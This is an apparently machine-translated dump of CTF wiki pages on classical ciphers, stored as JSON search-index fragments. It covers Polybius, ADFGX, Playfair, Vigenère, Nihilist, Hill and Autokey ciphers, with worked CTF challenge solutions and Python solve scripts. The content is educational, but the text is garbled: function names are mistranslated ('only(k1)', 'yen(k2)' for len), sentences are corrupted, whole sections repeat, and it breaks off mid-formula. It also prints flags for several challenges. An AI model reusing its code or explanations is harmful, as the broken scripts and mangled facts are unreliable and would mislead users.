intercepted a German telegram. All the words in the message were composed of five letters A, D, F, G, and X, hence the name ADFGX. . The ADFGX password was invented by German Colonel Fritz Nebel in March 1918 and is a dual encryption scheme that combines Polybius passwords and replacement passwords. For example, HELLO, using this form of encryption, is DD XF AG AG DF. Tools \u00b6 CrypTool Examples \u00b6 Here is an example of the An Heng Cup September Crypto competition Go. The title is: > \u5bc6 \u6587 \uff1a > The zip package gives a line of hex: 546865206c656e677468206f66207468697320706c61696e746578743a203130 > Please decrypt the ciphertext First, hexadecimal hexadecimal decoding, get the string: \"The length of this plaintext: 10\" The length of the ciphertext is 20, and the length of the plaintext is 10. The ciphertext has only five characters: \"l\", \"i\", \"n\", \"k\", \"e\", which is associated with the chessboard password. First try the five characters in alphabetical order: e i k l n | e | A | B | C | D | E | | i | F | G | H | I/J | K | | k | L | M | N | O | P | | l | Q | R | S | T | U | | n | V | W | X | Y | Z | Decrypted according to ciphertext: iytghpkqmq. This should not be the flag answer we want. It seems that the five-character arrangement is not arranged in this way. There are a total of 5! import itertools key = [] cipher = \"ilnllliiikkninlekile\" for i in itertools . permutations ( 'ilnke' , 5 ): key . append ( '' . join ( i )) for now_key in key : solve_c = \"\" true = & quot ; & quot ; for now_c in cipher : solve_c += str ( now_key . index ( now_c )) for i in range ( 0 , len ( solve_c ), 2 ): now_ascii = int ( solve_c [ i ]) * 5 + int ( solve_c [ i + 1 ]) + 97 if now_ascii > ord ( 'i' ): now_ascii += 1 res += chr ( now_ascii ) if \"flag\" in res : print now_key , res The script is actually the algorithm for implementing the checkerboard password, but the order of the five characters is not fixed. Run the following two results: > linke flagishere > lines flagkxhdwd Obviously the first one is the answer we want. Attach the correct password form: l i n k e | l | A | B | C | D | E | | i | F | G | H | I/J | K | | n | L | M | N | O | P | | k | Q | R | S | T | U | | e | V W | X Y | Z | Vigenere Virginia Password \u00b6 Principle \u00b6 The Virginia code (Vigenere) is an encryption algorithm that uses a series of Caesar ciphers to form a cipher alphabet, a simple form of multi-table ciphers. ![Virginia Form] (./figure/vigenere1.jpg) An example is given below Clear text: come greatwall Key: crypto First, the key is padded to the same length as the plaintext. \u660e\u6587 c o m e g r e a t w a l l | \u5bc6\u94a5 | c | r | y | p | t | o | c | r | y | p | t | o | c | Second, check the ciphertext ![Virginia Encryption] (./figure/vigenere2.jpg) Clear text: come greatwall Key: crypto Ciphertext: efkt zferrltzn \u7834 \u00b6 The deciphering of all multi-table ciphers, including the Virginia code, is based on the frequency of letters, but direct frequency analysis does not apply because in the Virginia code, a letter can be Encrypted into different ciphertexts, so simple frequency analysis is not useful here. The key to deciphering a Virginia password is that its key is cyclically repeated. If we know the length of the key, the ciphertext can be seen as an interlaced Caesar cipher, and each of them can be cracked separately. Regarding the length of the password, we can use the Kasiki test and the Friedman test to get it. The Kasiki test is based on the fact that common words like the one may be encrypted by the same key letter and thus repeated in the ciphertext. For example, different CRYPTOs in plaintext may be encrypted into different ciphertexts by the key ABCDEF: Key: ABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB The elements repeated in the plaintext at this time are not repeated in the ciphertext. However, if the keys are the same, the result might be (using the key ABCD): \u5bc6\u94a5 \uff1a ABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6 \u6587: CSASTP KV SIQUT GQU CSASTPIUAQJB At this point, the Kasiki test can produce results. This method is more efficient for longer paragraphs because there are usually more repeating fragments in the ciphertext. The length of the key can be deciphered by the following ciphertext: \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD Among them, the appearance of two DYDUXRMH is separated by 18 letters. Therefore, it can be assumed that the length of the key is a divisor of 18, that is, the length is 18, 9, 6, 3 or 2. The two NQDs are 20 letters apart, meaning the key length should be 20, 10, 5, 4 or 2. Taking the intersection of the two, the key length can be basically determined to be 2. The next step is to proceed further. For more detailed cracking principles, I will not do too much introduction here. See http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ . Tools \u00b6 Known key Python's pycipher library [Online decryption Vigen\u00e8re cipher] ( http://planetcalc.com/2468/ ) CAP4 Unknown key Vigen\u00e8re Cipher Codebreaker [Vigenere Solver] ( https://www.guballa.de/vigenere-solver ) is not perfect. Nihilist \u00b6 Principle \u00b6 The Nihilist password is also known as the keyword password: plain text + keyword = cipher text. Take the keyword helloworld as an example. First construct a checkerboard matrix using a key (similar to a Polybius password) - Create a new 5 \u00d7 5 matrix - Fill characters into the matrix without repeating them in order - The rest is filled in alphabetical order - the letters i and j are equivalent | | 1 | 2 | 3 | 4 | 5 | | --- | --- | --- | ----- | --- | --- | | 1 | h | e | l | of | w | | 2 | r | d | a | b | c | | 3 | f | g | i / j | k | m | | 4 | n | p | q | s | t | | 5 | u | v | x | y | z | Encrypt the encryption process reference matrix M: a -> M[2,3] -> 23 t -> M[4,5] -> 45 For the decryption process Decrypt with reference matrix M: 23 -> M[2,3] -> a 45 -> M[4,5] -> t It can be seen that the characteristics of ciphertext have the following points pure numbers only 1 to 5 Even ciphertext length. Hill \u00b6 Principle \u00b6 Hill (Hill) uses the order of each letter in the alphabet as its corresponding number, ie A=0, B=1, C=2, etc., and then converts the plaintext into an n-dimensional vector, followed by an n \u00d7 n The matrix is multiplied and the resulting result is modulo 26. Note that the matrix used for encryption (ie, the key) must be reversible at \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} , otherwise it is impossible to decode. Only the determinant of the matrix and the 26 prime are reversible. Here is an example Clear text: ACT Ming culture is a matrix. $$ \\begin{bmatrix} 0\\ 2\\ 19 \\end{bmatrix} $$ Suppose the key is: $$ \\begin{bmatrix} 6 & 24 & 1\\ 13 & 16 & 10\\ 20 & 17 & 15 \\end{bmatrix} $$ The encryption process is: $$ \\begin{bmatrix} 6 & 24 & 1\\ 13 & 16 & 10\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\ 2\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\ 222\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\ 14\\ 7 \\end{bmatrix} Way 26 $$ Ciphertext is Ciphertext: POH Tools \u00b6 http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool Examples \u00b6 Here we take ISCC 2015 base decrypt 150 as an example, the title is > ciphertext: 22,09,00,12,03,01,10,03,04,08,01,17 (wjamdbkdeibr) > The matrix used is 1 2 3 4 5 6 7 8 10 > Please decrypt the ciphertext. First, the matrix is 3 \u00d7 3 . Description Encrypts 3 characters each time. We use Cryptool directly. It should be noted that this matrix is arranged in columns. That is as follows 1 4 7 2 5 8 3 6 10 The final result is overthehillx . AutokeyCipher \u00b6 Principle \u00b6 Autokey Cipher is also a multi-table replacement password, similar to a Virginia password, but uses a different method to generate a key. It is generally safer than a Virginia password. There are two main types of automatic key passwords: keyword automatic key password and original automatic key password. Let's take the keyword automatic key as an example: \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG Keywords: CULTURE Automatically generate a key: CULTURE THE QUICK BROWN FOX JUMPS OVER THE The next encryption process is similar to the Virginia password, available from the corresponding table: Ciphertext VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK Tools \u00b6 Known keywords Python's pycipher library Unknown keywords http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ break_autokey.py under the tools folder, to be completed.","title":"Multi-table Substitution Cipher"},{"location":"crypto/classical/polyalphabetic/#playfair","text":"","title":"Playfair"},{"location":"crypto/classical/polyalphabetic/#principle","text":"The Playfair cipher or Playfair square is a replacement password, invented by the British Charles Wheatstone in 1854. The basic algorithm is as follows: Select a string of English letters, remove the repeated letters, and add the remaining letters one by one to the 5 \u00d7 5 matrix. The remaining space is added by the unjoined English letters in the order of az. Note that q is removed, or i and j are treated as the same word. Divide the plaintext to be encrypted into two groups. If the letters in the group are the same, add X (or Q) to the first letter of the group and regroup. If there is one word left, also add X. In each group, find out where the two letters are in the matrix. If the two letters have different rows and different columns, find the other two letters in the matrix (the first letter corresponds to the row first), so that the four letters become the four corners of a rectangle. If the two letters are accompanied, take the letters to the right of the two letters (if the letter is at the far right, take the leftmost letter). If the two letters are in the same column, take the letters below the two letters (if the letter is at the bottom, take the top letter). The two newly found letters are the result of the original two-letter encryption. Use playfair example as the key, get P L A Y F iREX B C D G H K N O Q S T U V W Z The message to be encrypted is Hide the gold in the tree stump THAT IS TH EG OL DI NT HE TR EX IS YOUR MP Will get BM OD ZB XD WILL BE DM UI XM FOR UV IF","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#tools","text":"CAP4","title":"Tools"},{"location":"crypto/classical/polyalphabetic/#polybius","text":"","title":", Polybius"},{"location":"crypto/classical/polyalphabetic/#principle_1","text":"Polybius passwords are also known as board passwords, which are generally used to encrypt a given plaintext into a pair of numbers. | | 1 | 2 | 3 | 4 | 5 | | :--- | --- | --- | --- | --- | :--- | | 1 | A | B | C | D | E | | 2 | F | G | H | I/J | K | | 3 | L | M | N | O | P | | 4 | Q | R | S | T | U | | 5 V W | X Y | Z | For example, plain text HELLO, encrypted is 23 15 31 31 34. Another password table | | A | D | F | G | X | | --- | --- | --- | --- | --- | --- | | A | b | t | a | l | p | | D | d | h | o | z | k | | F | q | f | v | s | n | | G | g | j | c | u | x | | X | m | r | e | w | y | Note that the order of the letters here is upset. The origin of ADFGX: > In 1918, when the First World War was about to end, the French army intercepted a German telegram. All the words in the message were composed of five letters A, D, F, G, and X, hence the name ADFGX. . The ADFGX password was invented by German Colonel Fritz Nebel in March 1918 and is a dual encryption scheme that combines Polybius passwords and replacement passwords. For example, HELLO, using this form of encryption, is DD XF AG AG DF.","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#tools_1","text":"CrypTool","title":"Tools"},{"location":"crypto/classical/polyalphabetic/#examples","text":"Here is an example of the An Heng Cup September Crypto competition Go. The title is: > \u5bc6 \u6587 \uff1a > The zip package gives a line of hex: 546865206c656e677468206f66207468697320706c61696e746578743a203130 > Please decrypt the ciphertext First, hexadecimal hexadecimal decoding, get the string: \"The length of this plaintext: 10\" The length of the ciphertext is 20, and the length of the plaintext is 10. The ciphertext has only five characters: \"l\", \"i\", \"n\", \"k\", \"e\", which is associated with the chessboard password. First try the five characters in alphabetical order: e i k l n | e | A | B | C | D | E | | i | F | G | H | I/J | K | | k | L | M | N | O | P | | l | Q | R | S | T | U | | n | V | W | X | Y | Z | Decrypted according to ciphertext: iytghpkqmq. This should not be the flag answer we want. It seems that the five-character arrangement is not arranged in this way. There are a total of 5! import itertools key = [] cipher = \"ilnllliiikkninlekile\" for i in itertools . permutations ( 'ilnke' , 5 ): key . append ( '' . join ( i )) for now_key in key : solve_c = \"\" true = & quot ; & quot ; for now_c in cipher : solve_c += str ( now_key . index ( now_c )) for i in range ( 0 , len ( solve_c ), 2 ): now_ascii = int ( solve_c [ i ]) * 5 + int ( solve_c [ i + 1 ]) + 97 if now_ascii > ord ( 'i' ): now_ascii += 1 res += chr ( now_ascii ) if \"flag\" in res : print now_key , res The script is actually the algorithm for implementing the checkerboard password, but the order of the five characters is not fixed. Run the following two results: > linke flagishere > lines flagkxhdwd Obviously the first one is the answer we want. Attach the correct password form: l i n k e | l | A | B | C | D | E | | i | F | G | H | I/J | K | | n | L | M | N | O | P | | k | Q | R | S | T | U | | e | V W | X Y | Z |","title":"Examples"},{"location":"crypto/classical/polyalphabetic/#vigenere-virginia-password","text":"","title":"Vigenere Virginia Password"},{"location":"crypto/classical/polyalphabetic/#principle_2","text":"The Virginia code (Vigenere) is an encryption algorithm that uses a series of Caesar ciphers to form a cipher alphabet, a simple form of multi-table ciphers. ![Virginia Form] (./figure/vigenere1.jpg) An example is given below Clear text: come greatwall Key: crypto First, the key is padded to the same length as the plaintext. \u660e\u6587 c o m e g r e a t w a l l | \u5bc6\u94a5 | c | r | y | p | t | o | c | r | y | p | t | o | c | Second, check the ciphertext ![Virginia Encryption] (./figure/vigenere2.jpg) Clear text: come greatwall Key: crypto Ciphertext: efkt zferrltzn","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#_1","text":"The deciphering of all multi-table ciphers, including the Virginia code, is based on the frequency of letters, but direct frequency analysis does not apply because in the Virginia code, a letter can be Encrypted into different ciphertexts, so simple frequency analysis is not useful here. The key to deciphering a Virginia password is that its key is cyclically repeated. If we know the length of the key, the ciphertext can be seen as an interlaced Caesar cipher, and each of them can be cracked separately. Regarding the length of the password, we can use the Kasiki test and the Friedman test to get it. The Kasiki test is based on the fact that common words like the one may be encrypted by the same key letter and thus repeated in the ciphertext. For example, different CRYPTOs in plaintext may be encrypted into different ciphertexts by the key ABCDEF: Key: ABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB The elements repeated in the plaintext at this time are not repeated in the ciphertext. However, if the keys are the same, the result might be (using the key ABCD): \u5bc6\u94a5 \uff1a ABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6 \u6587: CSASTP KV SIQUT GQU CSASTPIUAQJB At this point, the Kasiki test can produce results. This method is more efficient for longer paragraphs because there are usually more repeating fragments in the ciphertext. The length of the key can be deciphered by the following ciphertext: \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD Among them, the appearance of two DYDUXRMH is separated by 18 letters. Therefore, it can be assumed that the length of the key is a divisor of 18, that is, the length is 18, 9, 6, 3 or 2. The two NQDs are 20 letters apart, meaning the key length should be 20, 10, 5, 4 or 2. Taking the intersection of the two, the key length can be basically determined to be 2. The next step is to proceed further. For more detailed cracking principles, I will not do too much introduction here. See http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ .","title":"\u7834"},{"location":"crypto/classical/polyalphabetic/#tools_2","text":"Known key Python's pycipher library [Online decryption Vigen\u00e8re cipher] ( http://planetcalc.com/2468/ ) CAP4 Unknown key Vigen\u00e8re Cipher Codebreaker [Vigenere Solver] ( https://www.guballa.de/vigenere-solver ) is not perfect.","title":"Tools"},{"location":"crypto/classical/polyalphabetic/#nihilist","text":"","title":"Nihilist"},{"location":"crypto/classical/polyalphabetic/#principle_3","text":"The Nihilist password is also known as the keyword password: plain text + keyword = cipher text. Take the keyword helloworld as an example. First construct a checkerboard matrix using a key (similar to a Polybius password) - Create a new 5 \u00d7 5 matrix - Fill characters into the matrix without repeating them in order - The rest is filled in alphabetical order - the letters i and j are equivalent | | 1 | 2 | 3 | 4 | 5 | | --- | --- | --- | ----- | --- | --- | | 1 | h | e | l | of | w | | 2 | r | d | a | b | c | | 3 | f | g | i / j | k | m | | 4 | n | p | q | s | t | | 5 | u | v | x | y | z | Encrypt the encryption process reference matrix M: a -> M[2,3] -> 23 t -> M[4,5] -> 45 For the decryption process Decrypt with reference matrix M: 23 -> M[2,3] -> a 45 -> M[4,5] -> t It can be seen that the characteristics of ciphertext have the following points pure numbers only 1 to 5 Even ciphertext length.","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#hill","text":"","title":"Hill"},{"location":"crypto/classical/polyalphabetic/#principle_4","text":"Hill (Hill) uses the order of each letter in the alphabet as its corresponding number, ie A=0, B=1, C=2, etc., and then converts the plaintext into an n-dimensional vector, followed by an n \u00d7 n The matrix is multiplied and the resulting result is modulo 26. Note that the matrix used for encryption (ie, the key) must be reversible at \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} , otherwise it is impossible to decode. Only the determinant of the matrix and the 26 prime are reversible. Here is an example Clear text: ACT Ming culture is a matrix. $$ \\begin{bmatrix} 0\\ 2\\ 19 \\end{bmatrix} $$ Suppose the key is: $$ \\begin{bmatrix} 6 & 24 & 1\\ 13 & 16 & 10\\ 20 & 17 & 15 \\end{bmatrix} $$ The encryption process is: $$ \\begin{bmatrix} 6 & 24 & 1\\ 13 & 16 & 10\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\ 2\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\ 222\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\ 14\\ 7 \\end{bmatrix} Way 26 $$ Ciphertext is Ciphertext: POH","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#tools_3","text":"http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool","title":"Tools"},{"location":"crypto/classical/polyalphabetic/#examples_1","text":"Here we take ISCC 2015 base decrypt 150 as an example, the title is > ciphertext: 22,09,00,12,03,01,10,03,04,08,01,17 (wjamdbkdeibr) > The matrix used is 1 2 3 4 5 6 7 8 10 > Please decrypt the ciphertext. First, the matrix is 3 \u00d7 3 . Description Encrypts 3 characters each time. We use Cryptool directly. It should be noted that this matrix is arranged in columns. That is as follows 1 4 7 2 5 8 3 6 10 The final result is overthehillx .","title":"Examples"},{"location":"crypto/classical/polyalphabetic/#autokeycipher","text":"","title":"AutokeyCipher"},{"location":"crypto/classical/polyalphabetic/#principle_5","text":"Autokey Cipher is also a multi-table replacement password, similar to a Virginia password, but uses a different method to generate a key. It is generally safer than a Virginia password. There are two main types of automatic key passwords: keyword automatic key password and original automatic key password. Let's take the keyword automatic key as an example: \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG Keywords: CULTURE Automatically generate a key: CULTURE THE QUICK BROWN FOX JUMPS OVER THE The next encryption process is similar to the Virginia password, available from the corresponding table: Ciphertext VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK","title":"Principle"},{"location":"crypto/classical/polyalphabetic/#tools_4","text":"Known keywords Python's pycipher library Unknown keywords http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ break_autokey.py under the tools folder, to be completed.","title":"Tools"},{"location":"crypto/classical/summary/","text":"to sum up \u00b6 Classical Password Analysis \u00b6 The questions about classical ciphers in CTF are usually based on ciphertext to obtain plaintext. Therefore, ciphertext attack is mostly used. The basic analysis ideas are summarized as follows: Determine the password type: according to the prompt, encryption method, ciphertext character set, cipher text display form and other information. Determine the attack method: including direct analysis, brute force attack, statistical analysis and other methods. For special passwords of unknown type, the appropriate attack method should be selected according to their password characteristics. Identify analysis tools: Focus on online password analysis tools and Python scripting tools, supplemented by offline cryptanalysis tools and manual analysis. The applicable scenarios and examples of the above ciphertext attack methods are as follows: Attack Methods Applicable Scenarios Examples Direct Analysis Method | The password for the mapping relationship can be determined by the password type | Caesar password, pig password, keyboard password, etc. | | Brute force attack method | Replacement password or replacement password with small key space | Shift password, fence password, etc. | | Statistical Analysis | Replacement passwords with large key spaces | Simple replacement passwords, affine passwords, Virginia passwords, etc. | Experiment, love in the fence \u00b6 Description of the topic > I have been wondering about a question recently. Is QWE not equal to ABC? -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- > flag format: CTF{xxx} First of all, according to the password style, it is Moss code. After decryption, it gets KIQLWTFCQGNSOO . It doesn't look like flag. There are still fences and QWE in the end. It doesn&#39;t equal ABC . After both try it, It is found that QWE and then the fence can get the result. First, the keyboard QWE decrypts and tries to decrypt it to get IILYOAVNEBSAHR . Then the fence decrypts to get ILOVESHIYANBAR . 2017 SECCON Vigenere3d \u00b6 The procedure is as follows # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % only ( k1 ) i2 = ( i2 + 1 ) % yen ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { *************************** ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 Solution 1 : First, let\u2019s first analyze the composition of t. $$ t[i][j]=s[i+j:]+s[:i+j] \\ t[i][k]=s[i+k:]+s[:i+k] $$ t[i][j][k] t[i][j][k] is the kth character in t[i][j] t[i][j] , t[i][k][j] t[i][k][j] is $t[i][k] The jth character in $. Whether i+j+k i+j+k exceeds len(s) is always consistent, ie t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] . Therefore, in fact, for the same plaintext, there may be multiple keys to generate the same ciphertext. However, the above analysis is simply analysis, and the following begins. It is not difficult to see that each bit of the ciphertext is only related to the corresponding bit of the plaintext, and the space of each bit of the key is the size of s, so we can use the blast to obtain the key. Here, according to the above command line prompt, it can be known that the key length is 14, just the first 7 bytes of the plaintext are known. The recovery key exp is as follows def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) The script to restore the plaintext is as follows def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % only ( k1 ) i2 = ( i2 + 1 ) % yen ( k2 ) return plain Get the plain text below \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 } Solution 2 Analysis of this question: Considering that the array access will not cross the boundary under normal program operation, we will make the following convention when discussing: arr[index] \\Leftrightarrow arr[index \\% len(arr)] arr[index] \\Leftrightarrow arr[index \\% len(arr)] For the _l function defined in the python program, find the following equivalence relationship: \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] For the definition of the three-dimensional matrix t in python's main function, find the following equivalence relation: t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] Based on the observation of the second point 3, there is the following equivalence relation: t[a][b][c] \\Leftrightarrow s[a+b+c] t[a][b][c] \\Leftrightarrow s[a+b+c] We consider s as an encoding format, namely: encoding process s.find(x), decoding process s[x]. And directly replace the string it refers to by using the number of its encoded result, then the encryption process can be expressed by the following formula: - e = f + k1 +k2 e = f + k1 +k2 where e is ciphertext, f is plaintext, k1 and k2 are keys obtained by the copy method and of the same length as f, and addition is vector plus . So we only need to calculate the key by calculating k1+k2 and decrypt it. Decrypt the python script for this question: # exp2.py enc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} ' dec_dic = { k : v for v , k in enumerate ( enc_str )} encrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9' flag_bg = 'SECCON{**************************}' Sim_key = [ dec_dic [ encrypt [ i ]] - dec_dic [ flag_bg [ i ]] for i in range ( 7 )] #crack the emulation key sim_key = sim_key + sim_key [:: - 1 ] Flag_ed = [ dec_dic [ v ] - sim_key [ k % 14 ] for k , v in enumerate ( encrypt )] #imitation key decryption flag_ed = '' . join ([ enc_str [ i % len ( enc_str )] for i in flag_ed ]) # \u89e3\u7801 print ( flag_ed ) Get the plain text as follows: $ python exp2.py SECCON { Welc0me_to_SECCON_CTF_2017 } The disappearing triple password \u00b6 Ciphertext or sit kggd sit qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz so-called hxz zitd or gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl: hstqlt eiqfut is ygkd gy is fxdwtk ngx utz.zit hkgukqddtkl! Use quipquip to decrypt directly.","title":"Summary"},{"location":"crypto/classical/summary/#to-sum-up","text":"","title":"to sum up"},{"location":"crypto/classical/summary/#classical-password-analysis","text":"The questions about classical ciphers in CTF are usually based on ciphertext to obtain plaintext. Therefore, ciphertext attack is mostly used. The basic analysis ideas are summarized as follows: Determine the password type: according to the prompt, encryption method, ciphertext character set, cipher text display form and other information. Determine the attack method: including direct analysis, brute force attack, statistical analysis and other methods. For special passwords of unknown type, the appropriate attack method should be selected according to their password characteristics. Identify analysis tools: Focus on online password analysis tools and Python scripting tools, supplemented by offline cryptanalysis tools and manual analysis. The applicable scenarios and examples of the above ciphertext attack methods are as follows: Attack Methods Applicable Scenarios Examples Direct Analysis Method | The password for the mapping relationship can be determined by the password type | Caesar password, pig password, keyboard password, etc. | | Brute force attack method | Replacement password or replacement password with small key space | Shift password, fence password, etc. | | Statistical Analysis | Replacement passwords with large key spaces | Simple replacement passwords, affine passwords, Virginia passwords, etc. |","title":"Classical Password Analysis"},{"location":"crypto/classical/summary/#experiment-love-in-the-fence","text":"Description of the topic > I have been wondering about a question recently. Is QWE not equal to ABC? -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- > flag format: CTF{xxx} First of all, according to the password style, it is Moss code. After decryption, it gets KIQLWTFCQGNSOO . It doesn't look like flag. There are still fences and QWE in the end. It doesn&#39;t equal ABC . After both try it, It is found that QWE and then the fence can get the result. First, the keyboard QWE decrypts and tries to decrypt it to get IILYOAVNEBSAHR . Then the fence decrypts to get ILOVESHIYANBAR .","title":"Experiment, love in the fence"},{"location":"crypto/classical/summary/#2017-seccon-vigenere3d","text":"The procedure is as follows # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % only ( k1 ) i2 = ( i2 + 1 ) % yen ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { *************************** ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 Solution 1 : First, let\u2019s first analyze the composition of t. $$ t[i][j]=s[i+j:]+s[:i+j] \\ t[i][k]=s[i+k:]+s[:i+k] $$ t[i][j][k] t[i][j][k] is the kth character in t[i][j] t[i][j] , t[i][k][j] t[i][k][j] is $t[i][k] The jth character in $. Whether i+j+k i+j+k exceeds len(s) is always consistent, ie t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] . Therefore, in fact, for the same plaintext, there may be multiple keys to generate the same ciphertext. However, the above analysis is simply analysis, and the following begins. It is not difficult to see that each bit of the ciphertext is only related to the corresponding bit of the plaintext, and the space of each bit of the key is the size of s, so we can use the blast to obtain the key. Here, according to the above command line prompt, it can be known that the key length is 14, just the first 7 bytes of the plaintext are known. The recovery key exp is as follows def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) The script to restore the plaintext is as follows def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} \" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % only ( k1 ) i2 = ( i2 + 1 ) % yen ( k2 ) return plain Get the plain text below \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 } Solution 2 Analysis of this question: Considering that the array access will not cross the boundary under normal program operation, we will make the following convention when discussing: arr[index] \\Leftrightarrow arr[index \\% len(arr)] arr[index] \\Leftrightarrow arr[index \\% len(arr)] For the _l function defined in the python program, find the following equivalence relationship: \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset] For the definition of the three-dimensional matrix t in python's main function, find the following equivalence relation: t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c] t[a][b][c] \\Leftrightarrow 